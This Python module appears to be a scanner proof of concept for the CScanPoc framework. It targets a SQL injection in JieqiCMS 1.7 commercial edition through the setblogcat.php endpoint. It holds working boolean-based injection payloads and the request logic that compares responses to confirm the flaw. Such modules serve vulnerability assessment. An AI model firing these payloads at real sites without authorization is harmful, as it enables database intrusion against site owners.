# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import time


class Vuln(ABVuln):
    vuln_id = 'JieqiCMS_0001'  # 平台漏洞编号，留空
    name = '杰奇CMS 1.7商业版SQL注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2013-11-25'  # 漏洞公布时间
    desc = '''  
        当分隔符为in时没有对值有任何处理。EditPlus搜索含有"IN"的语句发现了注入。
    '''  # 漏洞描述
    ref = 'https://www.secpulse.com/archives/21233.html'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'JieqiCMS(杰奇CMS)'  # 漏洞应用名称
    product_version = '1.7'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '128a01cb-6023-46a7-b47f-5e26820c81bb'
    author = '47bwy'  # POC编写者
    create_date = '2018-06-14'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            payload1 = "/modules/space/setblogcat.php?action=do_edit&delete_checkbox[]=3))and 1=1%23"
            payload2 = "/modules/space/setblogcat.php?action=do_edit&delete_checkbox[]=3))and 1=2%23"
            url1 = self.target + payload1
            url2 = self.target + payload2
            r1 = requests.get(url1)
            r2 = requests.get(url2)

            if r1.text != r2.text:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
